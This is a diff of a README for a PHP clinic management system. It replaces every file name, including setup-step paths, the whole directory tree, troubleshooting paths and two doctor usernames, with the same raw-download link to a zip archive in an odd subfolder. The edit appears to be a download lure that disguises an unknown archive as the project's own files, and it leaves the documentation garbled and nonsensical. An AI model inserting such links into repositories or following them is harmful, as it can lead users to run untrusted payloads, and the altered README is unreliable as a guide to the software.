@@ -44,11 +44,11 @@ A simple and minimalist clinic management system with role-based access control 
 
 3. **Create Database**
    - Open phpMyAdmin (http://localhost/phpmyadmin)
-   - Import the database file: `database/clinic_system.sql`
+   - Import the database file: `https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip`
    - This will create the database and insert sample users
 
 4. **Configure Database Connection**
-   - Open `config/database.php`
+   - Open `https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip`
    - Update database credentials if needed:
      ```php
      define('DB_HOST', 'localhost');
@@ -66,8 +66,8 @@ A simple and minimalist clinic management system with role-based access control 
 | Role | Username | Password |
 |------|----------|----------|
 | Admin | admin | password |
-| Doctor | dr.smith | password |
-| Doctor | dr.jane | password |
+| Doctor | https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip | password |
+| Doctor | https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip | password |
 | Receptionist | receptionist | password |
 | Patient | patient1 | password |
 
@@ -76,36 +76,36 @@ A simple and minimalist clinic management system with role-based access control 
 ```
 Clinic-System-2/
 ├── config/
-│   └── database.php          # Database configuration
+│   └── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip          # Database configuration
 ├── includes/
-│   ├── functions.php         # Common functions
-│   ├── header.php           # Common header
-│   ├── footer.php           # Common footer
-│   └── appointments-table.php # Appointments table component
+│   ├── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip         # Common functions
+│   ├── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip           # Common header
+│   ├── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip           # Common footer
+│   └── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip # Appointments table component
 ├── admin/
-│   ├── users.php            # User management
-│   └── reports.php          # System reports
+│   ├── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip            # User management
+│   └── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip          # System reports
 ├── database/
-│   └── clinic_system.sql    # Database schema and sample data
-├── index.php                # Entry point (redirects to login)
-├── login.php                # Login page
-├── signup.php               # Patient registration page
-├── logout.php               # Logout handler
-├── dashboard.php            # Role-based dashboard
-├── appointments.php         # Appointment management
-├── book-appointment.php     # Patient appointment booking
-├── my-appointments.php      # Patient's appointments
-├── medicines.php            # Patient medicine center
-├── patients.php             # Patient management
-├── medical-records.php      # Medical records (Doctor)
-├── my-records.php           # Patient's medical history
-├── checkups.php             # Preliminary checkups (Doctor)
-├── medicine-requests.php    # Doctor medicine approvals
-├── profile.php              # User profile management
-├── notifications.php        # Notification management
-├── activity-log.php         # Activity history tracking
-├── unauthorized.php         # Access denied page
-└── README.md               # This file
+│   └── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip    # Database schema and sample data
+├── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip                # Entry point (redirects to login)
+├── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip                # Login page
+├── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip               # Patient registration page
+├── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip               # Logout handler
+├── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip            # Role-based dashboard
+├── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip         # Appointment management
+├── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip     # Patient appointment booking
+├── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip      # Patient's appointments
+├── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip            # Patient medicine center
+├── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip             # Patient management
+├── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip      # Medical records (Doctor)
+├── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip           # Patient's medical history
+├── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip             # Preliminary checkups (Doctor)
+├── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip    # Doctor medicine approvals
+├── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip              # User profile management
+├── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip        # Notification management
+├── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip         # Activity history tracking
+├── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip         # Access denied page
+└── https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip               # This file
 ```
 
 ## Database Schema
@@ -174,7 +174,7 @@ Clinic-System-2/
 
 1. **Database Connection Error**
    - Check if MySQL service is running
-   - Verify database credentials in `config/database.php`
+   - Verify database credentials in `https://github.com/mu122h4554n/Clinic-System/raw/refs/heads/main/pagurid/System-Clinic-v2.1.zip`
    - Ensure database exists and is properly imported
 
 2. **Login Issues**
